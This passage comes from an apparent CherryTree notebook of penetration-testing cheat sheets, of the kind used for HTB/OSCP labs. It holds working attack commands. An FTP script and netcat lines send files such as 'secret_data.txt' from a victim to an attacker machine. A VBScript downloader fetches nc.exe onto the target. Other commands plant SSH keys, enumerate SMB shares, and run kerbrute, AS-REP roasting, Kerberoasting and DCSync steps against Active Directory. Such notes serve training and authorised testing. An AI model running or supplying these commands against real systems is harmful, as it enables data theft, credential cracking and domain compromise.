          <rich_text family="monospace"> put secret_data.txt</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> ftp.txt
</rich_text>
          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
          <rich_text family="monospace"> bye </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> ftp.txt</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single" scale="h3">Exectue Script</rich_text>
          <rich_text underline="single"> (On Victim)</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">ftp -v -n -s:ftp.txt</rich_text>
        </node>
        <node name="Netcat" unique_id="54" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
          <rich_text underline="single" scale="h1">Netcat</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Receiving Shell</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">nc -l -p 1234 </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace"> out.file</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Sending Shell</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">nc -w 3 192.168.0.1 1234 </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&lt;</rich_text>
          <rich_text family="monospace"> out.file</rich_text>
        </node>
        <node name="TFTP" unique_id="55" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1696697351">
          <rich_text underline="single" scale="h1">TFTP</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Start TFTP Daemon (Folder /var/tftp)</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Transfer Files</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>



______________________________________________________________________________



</rich_text>
          <rich_text link="webs https://github.com/nigamelastic/cheat-sheets/blob/main/General/FTP.md#quick-ftp-transfer-from-windows-target-to-kali-attacker" scale="h2">Quick FTP transfer from windows target to kali attacker</rich_text>
          <rich_text>
Start FTP on Attacker Machine:
&#13;</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">&#13;
</rich_text>
          <rich_text>&#13;    

On Target Machine Use the following to transfer the file to Attacker:
&#13;</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">&#13;
</rich_text>
          <rich_text>
</rich_text>
          <codebox char_offset="78" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">atftpd --daemon --port 69 /var/tmp</codebox>
          <codebox char_offset="131" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">tftp -i 192.168.0.1 GET whoami.exe</codebox>
          <codebox char_offset="306" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">python -m pyftpdlib -p 4444 -u yo -P 123 -w </codebox>
          <codebox char_offset="387" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">PS C:\Users\nathan&gt; ftp&#13;
ftp&gt; open 192.168.119.185 4444&#13;
Connected to 192.168.119.185.&#13;
220 pyftpdlib 1.5.7 ready.&#13;
530 Log in with USER and PASS first.&#13;
User (192.168.119.185:(none)): yo&#13;
331 Username ok, send password.&#13;
Password:&#13;
230 Login successful.&#13;
ftp&gt; put jehe.jeher&#13;
200 Active data connection established.&#13;
125 Data connection already open. Transfer starting.&#13;
226 Transfer complete.&#13;
ftp: 52 bytes sent in 0.06Seconds 0.84Kbytes/sec.&#13;
ftp&gt;</codebox>
        </node>
        <node name="VBScript" unique_id="56" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
          <rich_text underline="single" scale="h1">VBScript</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</rich_text>
          <rich_text scale="h2">
</rich_text>
          <rich_text>
</rich_text>
          <rich_text underline="single" scale="h2">Create wget.vbs File</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">echo strUrl = WScript.Arguments.Item(0) </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo StrFile = WScript.Arguments.Item(1) </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Err.Clear </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Set http = Nothing </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo http.Open "GET",strURL,False </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo http.Send </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo varByteArray = http.ResponseBody </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Set http = Nothing </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo strData = "" </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo strBuffer = "" </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Next </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo ts.Close </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Download Files</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">cscript wget.vbs http://192.168.0.1/nc.exe nc.exe</rich_text>
        </node>
      </node>
      <node name="gobuster" unique_id="31" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684772533" ts_lastsave="1699312865">
        <rich_text scale="h1">Directory BF
</rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h3">Fast Scan (Small List)</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>



</rich_text>
        <rich_text scale="h3">Fast Scan (Big List)</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>



</rich_text>
        <rich_text scale="h3">Slow Scan (Check File Extensions)</rich_text>
        <rich_text>:

Definitely use it when u see `cgi-bin`  (even with http 403)

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

_______________________________________

</rich_text>
        <rich_text scale="h2">Using Proxy:
</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>



________________________________________

</rich_text>
        <rich_text scale="h2">HTTPS</rich_text>
        <rich_text>

To ignore ssl certificate use </rich_text>
        <rich_text family="monospace">-k </rich_text>
        <rich_text>flag</rich_text>
        <codebox char_offset="38" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir -e -u http://10.10.10.169 -w /usr/share/wordlists/dirb/big.txt -t 20 -o gobuster.log</codebox>
        <codebox char_offset="64" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir -e -u http://10.10.10.169 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster.log</codebox>
        <codebox char_offset="167" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir -e -u http://10.10.10.169 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,cgi,sh,bak,aspx -t 20 -o gobuster.log</codebox>
        <codebox char_offset="225" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir --proxy http://10.10.10.169:3128 -e -u http://10.10.10.169 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster.log</codebox>
      </node>
      <node name="ssh" unique_id="32" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684867617" ts_lastsave="1687291548">
        <rich_text scale="h2">SSH</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

_____________________________________

</rich_text>
        <rich_text scale="h3">Keygen</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

append to (server)

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

run the following in case

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h2">connecting:
</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#bf2e5e">ssh</rich_text>
        <rich_text> -o </rich_text>
        <rich_text foreground="#5ebdab">"UserKnownHostsFile=/dev/null"</rich_text>
        <rich_text> -o </rich_text>
        <rich_text foreground="#5ebdab">"StrictHostKeyChecking=no"</rich_text>
        <rich_text> -i temp root@10.10.10.169  -p 22


_____________________________________

</rich_text>
        <rich_text scale="h2">Port-Forwarding</rich_text>
        <rich_text justification="left" scale="h2"></rich_text>
        <rich_text scale="h2">:</rich_text>
        <rich_text>


  </rich_text>
        <codebox char_offset="5" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" root@10.10.10.169 -p 22</codebox>
        <codebox char_offset="55" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ssh-keygen -t rsa -b 4096</codebox>
        <codebox char_offset="78" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> ~/.ssh/authorized_keys</codebox>
        <codebox char_offset="108" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">chmod 600 ~/.ssh/authorized_keys</codebox>
        <codebox char_offset="281" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ssh -L 8000:127.0.0.1:8000 sau@10.10.10.169</codebox>
      </node>
      <node name="nikto" unique_id="33" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687617619" ts_lastsave="1687805895">
        <rich_text scale="h2">Usage
</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


</rich_text>
        <rich_text scale="h2">using ports</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <codebox char_offset="7" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nikto -host 10.10.10.169 | tee output.log</codebox>
        <codebox char_offset="24" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nikto -host 10.10.10.169 -port [port number 1], [port number 2], [port number 3]</codebox>
      </node>
      <node name="smb" unique_id="34" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687626207" ts_lastsave="1710628080">
        <rich_text scale="h1">Nmap</rich_text>
        <rich_text>


Enumerate shares: 

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

vuln scan:

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
_____________________________________
</rich_text>
        <rich_text scale="h2">Basics</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h2">SMBClient copying everything to local</rich_text>
        <rich_text>


</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

make sure if there is`$` in directory name u add it here too


Also check if u can put something in it:

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

once put u can check accesing them and try something like this </rich_text>
        <rich_text link="node 98">URI File Attack</rich_text>
        <rich_text>

_________________________________________________

</rich_text>
        <rich_text scale="h1">SMBMap</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

with specific user:

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

or anonymous

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

list contents of a directory and subdirectory:
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

to list all directories

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

make sure if the directory has `$` in the end its also in ur directoryName
________________________________________________

</rich_text>
        <rich_text scale="h2">Enum4linux</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

or

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


_________________________________________

</rich_text>
        <rich_text scale="h2">Cadaver</rich_text>
        <rich_text>

Can be used to upload or download from smb shares

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

Asks for username
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

To copy from local to remote:

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

To copy from remote:

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


____________________________________________

Also check



</rich_text>
        <rich_text link="node 41">CrackMapExec</rich_text>
        <rich_text>

Especially

</rich_text>
        <rich_text justification="left"></rich_text>
        <codebox char_offset="27" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap --script smb-enum-shares -p 139,445 10.10.10.169</codebox>
        <codebox char_offset="42" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap --script=smb-vuln* --script-args=unsafe=1 -T5 10.10.10.169</codebox>
        <codebox char_offset="90" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbclient -N -L 10.10.10.169   </codebox>
        <codebox char_offset="133" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbclient //10.10.10.169/directoryName -U &lt;username&gt;

recurse ON
prompt OFF
mget *</codebox>
        <codebox char_offset="241" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">put &lt;filename&gt;</codebox>
        <codebox char_offset="383" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -H 10.10.10.169</codebox>
        <codebox char_offset="407" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -H 10.10.10.169 -u &lt;user&gt; -p &lt;pass&gt;</codebox>
        <codebox char_offset="424" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -H 10.10.10.169 -u guest -p &lt;pass&gt;</codebox>
        <codebox char_offset="474" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -r DirectoryName -H 10.10.10.169</codebox>
        <codebox char_offset="502" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -r -H 10.10.10.169</codebox>
        <codebox char_offset="642" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">enum4linux -a 10.10.10.169</codebox>
        <codebox char_offset="649" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">enum4linux -u 'guest' -p '' -a 10.10.10.169</codebox>
        <codebox char_offset="756" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">cadaver http://10.10.10.169</codebox>
        <codebox char_offset="777" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Username: &lt;username&gt;
Password: &lt;password&gt;</codebox>
        <codebox char_offset="811" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">put &lt;filename&gt;</codebox>
        <codebox char_offset="836" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">get &lt;filename&gt;</codebox>
        <codebox char_offset="926" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.10.169 --shares -u '' -p ''</codebox>
      </node>
      <node name="Active Directory" unique_id="35" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687686505" ts_lastsave="1710614180">
        <rich_text>
</rich_text>
        <rich_text scale="h2">Methodology:</rich_text>
        <rich_text>

☐ </rich_text>
        <rich_text link="node 36">nmap</rich_text>
        <rich_text>
☐ </rich_text>
        <rich_text link="node 34">smb</rich_text>
        <rich_text>
☐ </rich_text>
        <rich_text link="node 108">ldap</rich_text>
        <rich_text>
☐ </rich_text>
        <rich_text link="node 89">88 Kerberos Auth</rich_text>
        <rich_text>
☐ </rich_text>
        <rich_text link="node 107">Certificates</rich_text>
        <rich_text>
☐ checkwinpeas (add any other user or credentials)
☐ if u find </rich_text>
        <rich_text family="monospace">users</rich_text>
        <rich_text> make sure if there are matching users using </rich_text>
        <rich_text family="monospace">net user </rich_text>
        <rich_text>command or/and checking </rich_text>
        <rich_text family="monospace">dir c:/Users</rich_text>
        <rich_text>
☐ use blood hound (check and update priveleges)
☐ DCSync </rich_text>
        <rich_text link="node 100">DACL/DC-Sync</rich_text>
        <rich_text>
☐ run </rich_text>
        <rich_text link="node 85">secretdumps-GetAllHashes</rich_text>
        <rich_text> dump with ur initial set of credentials to get priviliged hashes
_______________________________________________________________



</rich_text>
        <rich_text link="webs https://exploit-notes.hdks.org/exploit/windows/active-directory/">https://exploit-notes.hdks.org/exploit/windows/active-directory/</rich_text>
        <rich_text>

</rich_text>
        <rich_text link="webs https://book.hacktricks.xyz/windows-hardening/active-directory-methodology">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology</rich_text>
        <rich_text>
________________________________________
</rich_text>
        <rich_text link="webs https://zer1t0.gitlab.io/posts/attacking_ad/">https://zer1t0.gitlab.io/posts/attacking_ad/</rich_text>
        <rich_text>

</rich_text>
        <rich_text link="webs https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet">https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet</rich_text>
        <rich_text>

</rich_text>
        <rich_text link="webs https://tools.thehacker.recipes/">https://tools.thehacker.recipes/</rich_text>
        <rich_text>

</rich_text>
        <rich_text link="webs https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md">https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md</rich_text>
        <rich_text>
</rich_text>
        <rich_text link="webs https://gist.github.com/ssstonebraker/a1964b2f20acc8edb239409b6c4906ce">https://gist.github.com/ssstonebraker/a1964b2f20acc8edb239409b6c4906ce</rich_text>
        <rich_text>


Exe files to use for redteam:


</rich_text>
        <rich_text link="webs https://github.com/expl0itabl3/Toolies">https://github.com/expl0itabl3/Toolies</rich_text>
        <node name="88 Kerberos Auth" unique_id="89" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687808714" ts_lastsave="1697239770">
          <rich_text>

Check: </rich_text>
          <rich_text link="webs https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a">https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a</rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h1">Kerberos Authentication:</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

____________________________________________________________________________________

</rich_text>
          <rich_text justification="left"></rich_text>
          <codebox char_offset="109" justification="left" frame_width="1970" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
# make sure u add the domain to the ip in host file
kerbrute userenum -d spookysec.local --dc spookysec.local userlist.txt -t 100 

or
_______________________________________________________________________

## once u have list of users from ldap search or somewhere else

./kerbrute_linux_amd64 userenum -d hutch.offsec --dc 10.10.10.169 usernames.txt


____________________________________________________________________________________

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" 10.10.10.169
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='&lt;domain&gt;',userdb=/root/Desktop/usernames.txt 10.10.10.169

____________________________________________________________________________________


msf&gt; use auxiliary/gather/kerberos_enumusers

____________________________________________________________________________________


crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq</codebox>
          <codebox char_offset="198" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">

</codebox>
          <node name="ASRreproasting" unique_id="90" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687808714" ts_lastsave="1707853423">
            <rich_text scale="h1">Request AS_REP message</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h3">Using Impacket</rich_text>
            <rich_text>



</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
or without users:

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
or

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
once done either check for :

</rich_text>
            <rich_text link="node 34">smb</rich_text>
            <rich_text> or </rich_text>
            <rich_text link="node 44">Using Bloodhound</rich_text>
            <rich_text> python for more data 

or

</rich_text>
            <rich_text link="node 95">evilwinrm</rich_text>
            <rich_text>  for access with the cracked password

or </rich_text>
            <rich_text link="node 102">RPCClient</rich_text>
            <rich_text> </rich_text>
            <codebox char_offset="42" justification="left" frame_width="1810" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">#Try all the usernames in usernames.txt
impacket-GetNPUsers jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast -dc-ip 10.10.10.169
#Use domain creds to extract targets and target them
impacket-GetNPUsers jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast -dc-ip 10.10.10.169

or

impacket-GetNPUsers spookysec.local/svc-admin -no-pass


or

impacket-GetNPUsers domain.local/admin -request -no-pass -dc-ip 10.10.10.169
</codebox>
            <codebox char_offset="63" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GetNPUsers blackfield.local/ -dc-ip 10.10.10.169</codebox>
            <codebox char_offset="69" justification="left" frame_width="2086" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)

</codebox>
          </node>
          <node name="Kerberoasting" unique_id="101" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697239770" ts_lastsave="1710605936">
            <rich_text>• </rich_text>
            <rich_text link="webs https://adsecurity.org/?p=3458">https://adsecurity.org/?p=3458</rich_text>
            <rich_text>
• </rich_text>
            <rich_text link="webs https://exploit-notes.hdks.org/exploit/windows/active-directory/kerberos-pentesting/">https://exploit-notes.hdks.org/exploit/windows/active-directory/kerberos-pentesting/</rich_text>
            <rich_text>
• </rich_text>
            <rich_text link="webs https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast</rich_text>
            <rich_text>




</rich_text>
            <rich_text scale="h2">Via Impacket</rich_text>
            <rich_text>

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>


or


</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

Ex:

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>


once done we can crack it using john

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>


once we get the password we should use psexec to get a shell

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
Ex:
</rich_text>
            <rich_text justification="left"></rich_text>
            <codebox char_offset="226" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GetUserSPNs -hashes &lt;lmhash&gt;:&lt;nthash&gt; htb.local/username -outputfile hashes.txt</codebox>
            <codebox char_offset="235" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GetUserSPNs -request -dc-ip 10.10.10.169 &lt;DOMAIN.FULL&gt;/&lt;USERNAME&gt; -outputfile hashes.kerberoast</codebox>
            <codebox char_offset="243" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
impacket-GetUserSPNs -request -dc-ip 10.10.10.169 domain.local/user -outputfile hashes.kerberoast



or u can run it without password



impacket-GetUserSPNs -request -dc-ip 10.10.10.169 domain.local/user --no-pass -outputfile hashes.kerberoast

</codebox>
